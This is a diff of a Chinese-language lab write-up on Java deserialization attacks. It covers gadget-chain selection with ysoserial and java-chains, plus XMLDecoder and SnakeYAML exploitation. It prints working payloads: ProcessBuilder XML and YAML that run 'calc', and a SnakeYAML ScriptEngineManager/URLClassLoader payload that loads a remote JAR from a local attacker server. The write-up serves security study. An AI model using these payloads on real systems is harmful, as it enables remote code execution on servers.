 <p>在测试的时候可以先使用先用 “无危害探测链” 验证反序列化漏洞存在</p>
-<p><img src="/./images/image-20250818202755093.png" alt="image-20250818202755093"></p>
-<p><img src="/./images/image-20250818202954523.png" alt="image-20250818202954523"></p>
+<p><img src="/images/image-20250818202755093.png" alt="image-20250818202755093"></p>
+<p><img src="/images/image-20250818202954523.png" alt="image-20250818202954523"></p>
 <p>然后提交</p>
-<p><img src="/./images/image-20250818203008778.png" alt="image-20250818203008778"></p>
+<p><img src="/images/image-20250818203008778.png" alt="image-20250818203008778"></p>
 <p>就可以看到数据了</p>
 <blockquote>
 <p>在 Java 反序列化利用中，选择合适的利用链（Gadget Chain）核心在于<strong>匹配目标环境的依赖库、版本及应用特性</strong>。工具（如 ysoserial、marshalsec 等）只是生成对应链的 payload，能否成功利用完全取决于目标环境是否满足该链的 “触发条件”。以下是判断和选择利用链的核心思路：</p>
-<h3 id="一、核心判断依据：目标环境信息"><a href="#一、核心判断依据：目标环境信息" class="headerlink" title="一、核心判断依据：目标环境信息"></a>一、核心判断依据：目标环境信息</h3><p>任何利用链的触发都依赖目标环境中存在特定的类（通常来自第三方库），且这些类的版本支持链的调用逻辑（未被修复）。因此，<strong>收集目标环境信息是第一步</strong>。</p>
-<h4 id="1-确定目标使用的框架-依赖库"><a href="#1-确定目标使用的框架-依赖库" class="headerlink" title="1. 确定目标使用的框架 &#x2F; 依赖库"></a>1. 确定目标使用的框架 &#x2F; 依赖库</h4><p>反序列化利用链几乎都依赖第三方库（如 Apache Commons Collections、Jackson、ROME 等），或应用服务器自带的库（如 WebLogic、JBoss 的内置类）。需通过以下方式收集：</p>
+<h3 id="一、核心判断依据：目标环境信息">一、核心判断依据：目标环境信息</h3>
+<p>任何利用链的触发都依赖目标环境中存在特定的类（通常来自第三方库），且这些类的版本支持链的调用逻辑（未被修复）。因此，<strong>收集目标环境信息是第一步</strong>。</p>
+<h4 id="1-确定目标使用的框架-依赖库">1. 确定目标使用的框架 / 依赖库</h4>
+<p>反序列化利用链几乎都依赖第三方库（如 Apache Commons Collections、Jackson、ROME 等），或应用服务器自带的库（如 WebLogic、JBoss 的内置类）。需通过以下方式收集：</p>
 <ul>
-<li>指纹识别：通过应用响应头、错误页面（如500错误栈）、特殊路径（如&#x2F;META-INF&#x2F;maven&#x2F;）获取依赖信息。例如：<ul>
+<li>指纹识别：通过应用响应头、错误页面（如500错误栈）、特殊路径（如/META-INF/maven/）获取依赖信息。例如：
+<ul>
 <li>错误栈中出现<code>org.apache.commons.collections</code> → 存在 Commons Collections 库；</li>
 <li>响应头包含<code>X-Powered-By: JBoss</code> → 可能存在 JBoss 相关库。</li>
 </ul>
@@ -494,98 +551,127 @@
 <li><strong>文件泄露</strong>：若能获取目标的<code>WEB-INF/lib/</code>目录（如通过目录遍历漏洞），直接查看包含的<code>jar</code>包（如<code>commons-collections-3.2.1.jar</code>）。</li>
 <li><strong>主动探测</strong>：用无危害的 “探测链”（如 URLDNS 链）测试时，结合目标是否有特定类的加载行为（需配合日志或流量分析）。</li>
 </ul>
-<h4 id="2-确认依赖库的版本"><a href="#2-确认依赖库的版本" class="headerlink" title="2. 确认依赖库的版本"></a>2. 确认依赖库的版本</h4><p>同一库的不同版本可能支持不同的链。例如：</p>
+<h4 id="2-确认依赖库的版本">2. 确认依赖库的版本</h4>
+<p>同一库的不同版本可能支持不同的链。例如：</p>
 <ul>
-<li>Apache Commons Collections：<ul>
+<li>Apache Commons Collections：
+<ul>
 <li>3.1~3.2.1 版本支持<code>CommonsCollections1-7</code>等链；</li>
 <li>4.x 版本移除了部分关键类（如<code>Transformer</code>相关），原链失效；</li>
 </ul>
 </li>
-<li>Jackson：<ul>
+<li>Jackson：
+<ul>
 <li>2.8.10 之前的版本支持<code>Jackson</code>链，高版本修复了<code>@JsonTypeInfo</code>的反序列化漏洞。</li>
 </ul>
 </li>
 </ul>
 <p>需通过版本号（如<code>jar</code>包名中的<code>3.2.1</code>）或漏洞库（如 CVE）确认版本兼容性。</p>
-<h4 id="3-分析目标应用类型及限制"><a href="#3-分析目标应用类型及限制" class="headerlink" title="3. 分析目标应用类型及限制"></a>3. 分析目标应用类型及限制</h4><ul>
+<h4 id="3-分析目标应用类型及限制">3. 分析目标应用类型及限制</h4>
+<ul>
 <li><strong>应用服务器类型</strong>：WebLogic、JBoss、Tomcat 等有各自专属的利用链（如 WebLogic 的<code>wls9_async</code>链，依赖其内置的<code>AsyncResponseService</code>类）。</li>
 <li><strong>Java 版本</strong>：高版本 Java（如 8u121+、9+）引入了<code>serialFilter</code>、模块化限制等，可能阻断部分链（如<code>CommonsCollections1</code>在高版本 Java 中可能因反射权限被禁而失效）。</li>
 <li><strong>安全管理器（SecurityManager）</strong>：若目标启用了安全管理器，可能限制<code>Runtime.exec()</code>等关键操作，需选择绕开限制的链。</li>
 </ul>
-<h3 id="二、工具使用时的链选择逻辑"><a href="#二、工具使用时的链选择逻辑" class="headerlink" title="二、工具使用时的链选择逻辑"></a>二、工具使用时的链选择逻辑</h3><p>以最常用的<code>ysoserial</code>为例，其内置了数十种链（如<code>CommonsCollections1</code>、<code>URLDNS</code>、<code>ROME</code>等），选择逻辑如下：</p>
-<h4 id="1-先用-“无危害探测链”-验证反序列化漏洞存在"><a href="#1-先用-“无危害探测链”-验证反序列化漏洞存在" class="headerlink" title="1. 先用 “无危害探测链” 验证反序列化漏洞存在"></a>1. 先用 “无危害探测链” 验证反序列化漏洞存在</h4><p>优先使用<strong>仅触发网络请求或日志记录</strong>的链，避免对目标造成影响，同时验证反序列化入口是否有效。例如：</p>
+<h3 id="二、工具使用时的链选择逻辑">二、工具使用时的链选择逻辑</h3>
+<p>以最常用的<code>ysoserial</code>为例，其内置了数十种链（如<code>CommonsCollections1</code>、<code>URLDNS</code>、<code>ROME</code>等），选择逻辑如下：</p>
+<h4 id="1-先用-“无危害探测链”-验证反序列化漏洞存在">1. 先用 “无危害探测链” 验证反序列化漏洞存在</h4>
+<p>优先使用<strong>仅触发网络请求或日志记录</strong>的链，避免对目标造成影响，同时验证反序列化入口是否有效。例如：</p>
 <ul>
-<li>URLDNS 链：触发目标对指定域名的 DNS 查询（可通过 DNSlog 平台监测），适用于几乎所有环境（仅依赖 JDK 内置类）。<ul>
+<li>URLDNS 链：触发目标对指定域名的 DNS 查询（可通过 DNSlog 平台监测），适用于几乎所有环境（仅依赖 JDK 内置类）。
+<ul>
 <li>若 DNSlog 有记录 → 目标存在反序列化漏洞，可继续尝试执行命令的链；</li>
 <li>若无记录 → 可能入口无效，或被序列化过滤拦截。</li>
 </ul>
 </li>
 </ul>
-<h4 id="2-根据依赖库匹配可执行命令的链"><a href="#2-根据依赖库匹配可执行命令的链" class="headerlink" title="2. 根据依赖库匹配可执行命令的链"></a>2. 根据依赖库匹配可执行命令的链</h4><p>确认漏洞存在后，根据收集到的依赖库信息，选择对应的链：</p>
+<h4 id="2-根据依赖库匹配可执行命令的链">2. 根据依赖库匹配可执行命令的链</h4>
+<p>确认漏洞存在后，根据收集到的依赖库信息，选择对应的链：</p>
 <ul>
 <li><strong>若存在 Apache Commons Collections（3.x）</strong>：优先尝试<code>CommonsCollections1</code>（最经典，兼容性广）；若失败，依次测试<code>CommonsCollections2-7</code>（针对不同调用路径）。</li>
 <li><strong>若存在 ROME 库</strong>：使用<code>ROME</code>链（依赖<code>rome-1.0.jar</code>中的<code>ObjectBean</code>类）。</li>
 <li><strong>若存在 Jackson 库（低版本）</strong>：使用<code>Jackson</code>链（利用<code>@JsonTypeInfo</code>反序列化任意类）。</li>
 <li><strong>若为 WebLogic 服务器</strong>：尝试<code>wls9_async</code>、<code>wls10</code>等专属链（依赖 WebLogic 的<code>weblogic.jms.common.StreamMessageImpl</code>等类）。</li>
 </ul>
-<h4 id="3-排除法：从-“高兼容性”-到-“专属链”"><a href="#3-排除法：从-“高兼容性”-到-“专属链”" class="headerlink" title="3. 排除法：从 “高兼容性” 到 “专属链”"></a>3. 排除法：从 “高兼容性” 到 “专属链”</h4><p>若环境信息不明确，可按以下顺序测试（兼容性从高到低）：</p>
+<h4 id="3-排除法：从-“高兼容性”-到-“专属链”">3. 排除法：从 “高兼容性” 到 “专属链”</h4>
+<p>若环境信息不明确，可按以下顺序测试（兼容性从高到低）：</p>
 <ol>
 <li><strong>JDK 内置类链</strong>：如<code>URLDNS</code>（探测用）、<code>Jdk7u21</code>（依赖 JDK 7u21 及以下的<code>sun.rmi.server.UnicastRef</code>类）。</li>
 <li><strong>高流行度库链</strong>：如<code>CommonsCollections1</code>（Apache Commons Collections 应用极广）、<code>Log4j</code>（若存在特定版本）。</li>
 <li><strong>应用服务器专属链</strong>：如 WebLogic、JBoss、Jenkins 等各自的链。</li>
 <li><strong>小众库链</strong>：如<code>C3P0</code>、<code>JBossInterceptors</code>等（仅当确认目标存在对应库时尝试）。</li>
 </ol>
-<h3 id="三、典型场景示例"><a href="#三、典型场景示例" class="headerlink" title="三、典型场景示例"></a>三、典型场景示例</h3><ul>
+<h3 id="三、典型场景示例">三、典型场景示例</h3>
+<ul>
 <li><strong>场景 1</strong>：目标错误页显示<code>org.apache.commons.collections.map.LazyMap</code> → 存在 Commons Collections 3.x → 优先用<code>CommonsCollections1</code>。</li>
 <li><strong>场景 2</strong>：目标是 WebLogic 10.3.6 → 尝试<code>wls9_async</code>链（WebLogic 专属，无需第三方库）。</li>
 <li><strong>场景 3</strong>：目标 Java 版本为 8u200+ → 避开<code>CommonsCollections1</code>（可能因反射限制失效），尝试<code>Groovy</code>链（若存在 Groovy 库）。</li>
 </ul>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>核心逻辑：<strong>“环境决定链”</strong>。先通过各种方式收集目标的依赖库、版本、应用类型等信息，再对照工具中链的 “依赖条件”（可查看 ysoserial 源码中各链的实现，了解其依赖的类），最终匹配出可能有效的链。若信息不足，从高兼容性链开始逐步测试，结合执行结果（如命令回显、文件写入、DNSlog）验证有效性。</p>
+<h3 id="总结">总结</h3>
+<p>核心逻辑：<strong>“环境决定链”</strong>。先通过各种方式收集目标的依赖库、版本、应用类型等信息，再对照工具中链的 “依赖条件”（可查看 ysoserial 源码中各链的实现，了解其依赖的类），最终匹配出可能有效的链。若信息不足，从高兼容性链开始逐步测试，结合执行结果（如命令回显、文件写入、DNSlog）验证有效性。</p>
 </blockquote>
 <p>-<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>    经典工具</p>
 <p>-<a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a>   本次使用</p>
-<h4 id="Java-chains"><a href="#Java-chains" class="headerlink" title="Java-chains"></a>Java-chains</h4><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a> </p>
+<h4 id="Java-chains">Java-chains</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a></p>
 <p>部署按照教程部署</p>
 <p>使用</p>
-<p><img src="/./images/image-20250817232105941.png" alt="image-20250817232105941"></p>
+<p><img src="/images/image-20250817232105941.png" alt="image-20250817232105941"></p>
 <p>将生成的payload复制到靶场中，也可以弹出计算器</p>
-<h3 id="xmldecoder"><a href="#xmldecoder" class="headerlink" title="xmldecoder"></a>xmldecoder</h3><p>在靶场中直接输入执行的命令就可以执行了</p>
-<p><img src="/./images/image-20250818203553496.png" alt="image-20250818203553496"></p>
+<h3 id="xmldecoder">xmldecoder</h3>
+<p>在靶场中直接输入执行的命令就可以执行了</p>
+<p><img src="/images/image-20250818203553496.png" alt="image-20250818203553496"></p>
 <p>原理剖析</p>
 <blockquote>
-<h3 id="一、代码对数据包的处理流程"><a href="#一、代码对数据包的处理流程" class="headerlink" title="一、代码对数据包的处理流程"></a>一、代码对数据包的处理流程</h3><p>当浏览器发送<code>GET /home/deserialize/xmldecoder?cmd=calc HTTP/1.1</code>请求后，代码的执行步骤如下：</p>
+<h3 id="一、代码对数据包的处理流程">一、代码对数据包的处理流程</h3>
+<p>当浏览器发送<code>GET /home/deserialize/xmldecoder?cmd=calc HTTP/1.1</code>请求后，代码的执行步骤如下：</p>
 <ol>
-<li><p><strong>接收用户输入</strong>：<br>控制器方法<code>xmlDecoder</code>通过<code>String cmd</code>参数获取 URL 中<code>cmd=calc</code>的值（即用户输入的<code>calc</code>）。</p>
+<li>
+<p><strong>接收用户输入</strong>：<br>
+控制器方法<code>xmlDecoder</code>通过<code>String cmd</code>参数获取 URL 中<code>cmd=calc</code>的值（即用户输入的<code>calc</code>）。</p>
 </li>
-<li><p><strong>构建恶意 XML</strong>：<br>代码将<code>cmd</code>按空格分割为字符串数组（这里<code>cmd=calc</code>分割后为<code>[&quot;calc&quot;]</code>），然后动态拼接成一个 XML 文档：</p>
+<li>
+<p><strong>构建恶意 XML</strong>：<br>
+代码将<code>cmd</code>按空格分割为字符串数组（这里<code>cmd=calc</code>分割后为<code>[&quot;calc&quot;]</code>），然后动态拼接成一个 XML 文档：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_151&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>这个 XML 的含义是：创建一个<code>ProcessBuilder</code>对象，传入参数<code>[&quot;calc&quot;]</code>，并调用其<code>start()</code>方法（用于执行系统命令）。</p>
 </li>
-<li><p><strong>XML 反序列化执行</strong>：<br>代码使用<code>java.beans.XMLDecoder</code>解析上述 XML：</p>
+<li>
+<p><strong>XML 反序列化执行</strong>：<br>
+代码使用<code>java.beans.XMLDecoder</code>解析上述 XML：</p>
 <ul>
 <li>通过<code>ByteArrayInputStream</code>将 XML 字符串转为输入流；</li>
 <li>调用<code>xmlDecoder.readObject()</code>方法，触发 XML 反序列化过程；</li>
 <li><code>XMLDecoder</code>会按照 XML 定义，实例化<code>ProcessBuilder</code>对象并执行<code>start()</code>方法，最终在服务器上执行<code>calc</code>命令（打开计算器）。</li>
 </ul>
 </li>
-<li><p><strong>返回结果</strong>：<br>无论成功或失败，都会将结果（如 “执行成功” 或异常信息）通过<code>model</code>传递到前端页面展示。</p>
+<li>
+<p><strong>返回结果</strong>：<br>
+无论成功或失败，都会将结果（如 “执行成功” 或异常信息）通过<code>model</code>传递到前端页面展示。</p>
 </li>
 </ol>
 </blockquote>
-<h3 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<h3 id="SnakeYaml">SnakeYaml</h3>
+<h4 id="原理">原理</h4>
+<blockquote>
 <p>SnakeYAML 是 Java 中常用的 YAML 格式解析库，其反序列化功能用于将 YAML 文档转换为 Java 对象。但在默认配置下，SnakeYAML 的反序列化存在安全风险，可能被攻击者利用执行恶意代码。其核心原理可分为<strong>正常解析流程</strong>和<strong>安全风险成因</strong>两部分：</p>
-<h3 id="一、SnakeYAML-反序列化的正常流程"><a href="#一、SnakeYAML-反序列化的正常流程" class="headerlink" title="一、SnakeYAML 反序列化的正常流程"></a>一、SnakeYAML 反序列化的正常流程</h3><p>SnakeYAML 的反序列化本质是 “根据 YAML 文档的描述，实例化并组装 Java 对象”，核心步骤如下：</p>
+<h3 id="一、SnakeYAML-反序列化的正常流程">一、SnakeYAML 反序列化的正常流程</h3>
+<p>SnakeYAML 的反序列化本质是 “根据 YAML 文档的描述，实例化并组装 Java 对象”，核心步骤如下：</p>
 <ol>
-<li><p><strong>解析 YAML 文档</strong><br>当调用<code>Yaml.load()</code>（或<code>loadAs()</code>等方法）时，SnakeYAML 首先会解析输入的 YAML 字符串，识别其中的<strong>数据结构</strong>（如映射、列表、标量）和<strong>类型标签</strong>（用于指定 Java 类）。<br>YAML 中通过<code>!!</code>标签指定要实例化的 Java 类，例如：</p>
+<li>
+<p><strong>解析 YAML 文档</strong><br>
+当调用<code>Yaml.load()</code>（或<code>loadAs()</code>等方法）时，SnakeYAML 首先会解析输入的 YAML 字符串，识别其中的<strong>数据结构</strong>（如映射、列表、标量）和<strong>类型标签</strong>（用于指定 Java 类）。<br>
+YAML 中通过<code>!!</code>标签指定要实例化的 Java 类，例如：</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!java.util.HashMap</span></span><br><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure>
-
 <p>表示 “反序列化为一个<code>java.util.HashMap</code>对象，其键值对为<code>key: value</code>”。</p>
 </li>
-<li><p><strong>通过 Constructor 创建对象</strong><br>SnakeYAML 的<code>Constructor</code>类是反序列化的核心组件，负责将解析后的 YAML 节点转换为 Java 对象：</p>
+<li>
+<p><strong>通过 Constructor 创建对象</strong><br>
+SnakeYAML 的<code>Constructor</code>类是反序列化的核心组件，负责将解析后的 YAML 节点转换为 Java 对象：</p>
 <ul>
 <li>对于基本类型（如字符串、数字）或简单集合（如<code>List</code>、<code>Map</code>），<code>Constructor</code>会直接创建对应实例并赋值；</li>
-<li>对于自定义类或复杂类型，Constructor会：<ol>
+<li>对于自定义类或复杂类型，Constructor会：
+<ol>
 <li>根据 YAML 中的类名（如<code>!!com.example.User</code>）通过反射找到对应的 Java 类；</li>
 <li>调用该类的构造方法（默认优先无参构造，也支持有参构造）实例化对象；</li>
 <li>解析 YAML 中的属性（如<code>name: &quot;test&quot;</code>），通过反射设置对象的字段值（或调用 setter 方法）。</li>
@@ -593,21 +679,30 @@
 </li>
 </ul>
 </li>
-<li><p><strong>组装对象并返回</strong><br>若 YAML 中包含嵌套结构（如对象中包含另一个对象），<code>Constructor</code>会递归执行上述步骤，最终组装出完整的对象树并返回。</p>
+<li>
+<p><strong>组装对象并返回</strong><br>
+若 YAML 中包含嵌套结构（如对象中包含另一个对象），<code>Constructor</code>会递归执行上述步骤，最终组装出完整的对象树并返回。</p>
 </li>
 </ol>
-<h3 id="二、安全风险：默认配置下的反序列化漏洞成因"><a href="#二、安全风险：默认配置下的反序列化漏洞成因" class="headerlink" title="二、安全风险：默认配置下的反序列化漏洞成因"></a>二、安全风险：默认配置下的反序列化漏洞成因</h3><p>SnakeYAML 的风险核心在于<strong>默认 Constructor 允许实例化任意 Java 类</strong>，且在对象实例化 &#x2F; 属性赋值过程中可能触发危险方法，导致攻击者可构造恶意 YAML 执行代码。具体原因如下：</p>
+<h3 id="二、安全风险：默认配置下的反序列化漏洞成因">二、安全风险：默认配置下的反序列化漏洞成因</h3>
+<p>SnakeYAML 的风险核心在于<strong>默认 Constructor 允许实例化任意 Java 类</strong>，且在对象实例化 / 属性赋值过程中可能触发危险方法，导致攻击者可构造恶意 YAML 执行代码。具体原因如下：</p>
 <ol>
-<li><p><strong>无限制的类实例化</strong><br>默认情况下，<code>Yaml</code>对象使用<code>DefaultConstructor</code>，该构造器不限制可实例化的类 —— 只要 YAML 中指定了全类名（如<code>!!java.lang.Runtime</code>），SnakeYAML 就会尝试通过反射创建该类的实例。</p>
+<li>
+<p><strong>无限制的类实例化</strong><br>
+默认情况下，<code>Yaml</code>对象使用<code>DefaultConstructor</code>，该构造器不限制可实例化的类 —— 只要 YAML 中指定了全类名（如<code>!!java.lang.Runtime</code>），SnakeYAML 就会尝试通过反射创建该类的实例。</p>
 <p>这意味着攻击者可以在 YAML 中指定<strong>具有危险行为的类</strong>（如<code>java.lang.ProcessBuilder</code>、<code>java.lang.Runtime</code>等可执行系统命令的类）。</p>
 </li>
-<li><p><strong>方法调用与属性赋值的副作用</strong><br>部分类在<strong>实例化</strong>或<strong>属性设置</strong>过程中会触发危险操作：</p>
+<li>
+<p><strong>方法调用与属性赋值的副作用</strong><br>
+部分类在<strong>实例化</strong>或<strong>属性设置</strong>过程中会触发危险操作：</p>
 <ul>
 <li>例如，<code>ProcessBuilder</code>的<code>start()</code>方法可执行系统命令，若攻击者在 YAML 中构造<code>ProcessBuilder</code>并触发其<code>start()</code>调用，即可在服务器执行命令；</li>
 <li>某些类的 setter 方法或构造方法本身包含危险逻辑（如文件操作、网络连接），反序列化时会被自动调用。</li>
 </ul>
 </li>
-<li><p><strong>恶意 YAML payload 示例</strong><br>一个典型的恶意 YAML payload 如下，用于执行<code>calc</code>命令（打开计算器）：</p>
+<li>
+<p><strong>恶意 YAML payload 示例</strong><br>
+一个典型的恶意 YAML payload 如下，用于执行<code>calc</code>命令（打开计算器）：</p>
 <blockquote>
 <p>!!java.lang.ProcessBuilder [[“calc”]]</p>
 </blockquote>
@@ -619,33 +714,44 @@
 </ul>
 </li>
 </ol>
-<h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>SnakeYAML 反序列化的核心原理是 “基于 YAML 标签和数据，通过反射动态创建并组装 Java 对象”。其安全风险源于<strong>默认配置下对可实例化类无限制</strong>，攻击者可构造恶意 YAML，让 SnakeYAML 实例化危险类并触发其方法，最终执行恶意代码。</p>
+<h3 id="三、总结">三、总结</h3>
+<p>SnakeYAML 反序列化的核心原理是 “基于 YAML 标签和数据，通过反射动态创建并组装 Java 对象”。其安全风险源于<strong>默认配置下对可实例化类无限制</strong>，攻击者可构造恶意 YAML，让 SnakeYAML 实例化危险类并触发其方法，最终执行恶意代码。</p>
 <p>安全使用方式：通过自定义<code>Constructor</code>限制可反序列化的类（白名单机制），禁止实例化<code>ProcessBuilder</code>、<code>Runtime</code>等危险类。</p>
 </blockquote>
-<p><img src="/./images/image-20250818214718656.png" alt="image-20250818214718656"></p>
+<p><img src="/images/image-20250818214718656.png" alt="image-20250818214718656"></p>
 <p>对于靶场中当提交payload后</p>
-<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><blockquote>
-<h3 id="一、后端代码的处理逻辑"><a href="#一、后端代码的处理逻辑" class="headerlink" title="一、后端代码的处理逻辑"></a>一、后端代码的处理逻辑</h3><p>后端代码是一个 Spring 控制器，核心逻辑如下：</p>
+<h4 id="流程">流程</h4>
+<blockquote>
+<h3 id="一、后端代码的处理逻辑">一、后端代码的处理逻辑</h3>
+<p>后端代码是一个 Spring 控制器，核心逻辑如下：</p>
 <ol>
 <li>接收前端传入的<code>content</code>参数（即用户可控的 YAML 字符串）；</li>
 <li>使用 SnakeYAML 的<code>Yaml</code>类（默认配置）调用<code>load(content)</code>方法，对 YAML 字符串进行反序列化；</li>
 <li>反序列化过程会根据 YAML 中的定义实例化 Java 对象，并返回结果。</li>
 </ol>
 <p><strong>关键风险点</strong>：代码使用了<code>new Yaml()</code>的默认构造，此时 SnakeYAML 会使用<code>DefaultConstructor</code>—— 该构造器<strong>不限制可实例化的类</strong>，允许攻击者指定任意 Java 类进行反序列化。</p>
-<h3 id="二、Payload-的结构与执行流程"><a href="#二、Payload-的结构与执行流程" class="headerlink" title="二、Payload 的结构与执行流程"></a>二、Payload 的结构与执行流程</h3><p>传入的 YAML payload 为：</p>
+<h3 id="二、Payload-的结构与执行流程">二、Payload 的结构与执行流程</h3>
+<p>传入的 YAML payload 为：</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&#x27;http://127.0.0.1:8000/upload/yaml-payload.jar&#x27;</span>]]]]</span><br></pre></td></tr></table></figure>
-
 <p>其本质是通过 SnakeYAML 的反序列化机制，依次实例化三个关键类，形成攻击链：<code>URL</code> → <code>URLClassLoader</code> → <code>ScriptEngineManager</code>，最终触发恶意代码执行。具体流程如下：</p>
-<h4 id="1-实例化java-net-URL对象"><a href="#1-实例化java-net-URL对象" class="headerlink" title="1. 实例化java.net.URL对象"></a>1. 实例化<code>java.net.URL</code>对象</h4><ul>
-<li>YAML 中<code>!!java.net.URL [&#39;http://127.0.0.1:8000/upload/yaml-payload.jar&#39;]</code>表示：<br>反序列化一个<code>URL</code>对象，指向攻击者控制的恶意 JAR 包地址（<code>http://127.0.0.1:8000/upload/yaml-payload.jar</code>）。</li>
+<h4 id="1-实例化java-net-URL对象">1. 实例化<code>java.net.URL</code>对象</h4>
+<ul>
+<li>YAML 中<code>!!java.net.URL ['http://127.0.0.1:8000/upload/yaml-payload.jar']</code>表示：<br>
+反序列化一个<code>URL</code>对象，指向攻击者控制的恶意 JAR 包地址（<code>http://127.0.0.1:8000/upload/yaml-payload.jar</code>）。</li>
 </ul>
-<h4 id="2-实例化java-net-URLClassLoader对象"><a href="#2-实例化java-net-URLClassLoader对象" class="headerlink" title="2. 实例化java.net.URLClassLoader对象"></a>2. 实例化<code>java.net.URLClassLoader</code>对象</h4><ul>
-<li><p>YAML 中<code>!!java.net.URLClassLoader [[...]]</code>表示：<br>反序列化一个<code>URLClassLoader</code>（类加载器），其构造参数是上一步创建的<code>URL</code>数组（即恶意 JAR 的地址）。</p>
+<h4 id="2-实例化java-net-URLClassLoader对象">2. 实例化<code>java.net.URLClassLoader</code>对象</h4>
+<ul>
+<li>
+<p>YAML 中<code>!!java.net.URLClassLoader [[...]]</code>表示：<br>
+反序列化一个<code>URLClassLoader</code>（类加载器），其构造参数是上一步创建的<code>URL</code>数组（即恶意 JAR 的地址）。</p>
 <p><code>URLClassLoader</code>的作用是<strong>从指定的 URL（远程或本地）加载类文件</strong>。这里配置后，该类加载器会从<code>yaml-payload.jar</code>中加载类。</p>
 </li>
 </ul>
-<h4 id="3-实例化javax-script-ScriptEngineManager对象"><a href="#3-实例化javax-script-ScriptEngineManager对象" class="headerlink" title="3. 实例化javax.script.ScriptEngineManager对象"></a>3. 实例化<code>javax.script.ScriptEngineManager</code>对象</h4><ul>
-<li><p>YAML 中<code>!!javax.script.ScriptEngineManager [...]</code>表示：<br>反序列化一个<code>ScriptEngineManager</code>（脚本引擎管理器），其构造参数是上一步创建的<code>URLClassLoader</code>。</p>
+<h4 id="3-实例化javax-script-ScriptEngineManager对象">3. 实例化<code>javax.script.ScriptEngineManager</code>对象</h4>
+<ul>
+<li>
+<p>YAML 中<code>!!javax.script.ScriptEngineManager [...]</code>表示：<br>
+反序列化一个<code>ScriptEngineManager</code>（脚本引擎管理器），其构造参数是上一步创建的<code>URLClassLoader</code>。</p>
 <p><code>ScriptEngineManager</code>的核心特性是：<strong>在初始化时会自动扫描并加载可用的脚本引擎</strong>（通过<code>ServiceLoader</code>机制）。具体来说：</p>
 <ul>
 <li>它会使用传入的<code>URLClassLoader</code>去加载<code>yaml-payload.jar</code>中的类；</li>
